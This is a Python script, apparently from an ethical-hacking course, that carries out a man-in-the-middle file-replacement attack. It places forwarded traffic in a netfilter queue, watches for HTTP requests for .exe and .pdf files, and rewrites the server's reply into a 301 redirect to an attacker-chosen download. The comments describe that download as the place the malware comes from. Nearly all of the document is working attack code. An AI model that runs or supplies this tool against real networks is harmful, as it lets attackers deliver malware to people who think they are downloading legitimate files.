#!/usr/bin/env python

# Here we want to modify requests, but scapy cannot be used to intercept or drop packets
# Thus, here we receive a req., then create a copy and modify the request and send both to the target
# Target receives 2 requests but responds to the request it receives first.
# Thus we use a QUEUE to trap packets i.e. pause them so that we can modify and send 1 request only
# Same method used for responses.. trap the response, modify and send 1 response.
import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse
import http

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # since we modified the packet, the below values change, so we just delete it and scapy will auto recalculate
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


# We'll try to modify the response instead of request since if we modify request we'll have
# to work on the TCP handshake too. But if modifying response, the handshake is already done

# But we need only the particular response that maps to the download file request
# For this we use, ack/seq nos. :D that's why we use ack_list above

# Then, to modify response we don't want 200 OK status code, instead we use the
# 301 Moved Permanently and provide the redirection Location with a malicious download link
# eg. shown in https://en.wikipedia.org/wiki/HTTP_301


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # We use scapy.Raw to basically check for HTTP layer, since Raw contains the Data and the other
    # layers are IP/TCP/UDP
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load: # and "evil url" not in scapy_packet[scapy.Raw].load
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
            if ".pdf" in scapy_packet[scapy.Raw].load:
                print("[+] pdf Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # print(scapy_packet.show())
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("Inacklist", ack_list)
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # print(scapy_packet.show())
                # Adding \n\n at the end in the load so that nothing on the line in the actual response messes with our modification
                # specify the malicious location below from where you want the malware to be downloaded.
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-590.exe\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept()


# For local computer testing we modify OUTPUT INPUT instead of FORWARD
# subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
# subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])


# For MITM, we modify the FORWARD chain
subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

print("[+] Successfully modified iptables...")

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("[+] Successfully flushed iptables...")

# http://www.winimage.com/download.htm - use this link to test
# and try downloading file wima6481.exe http link












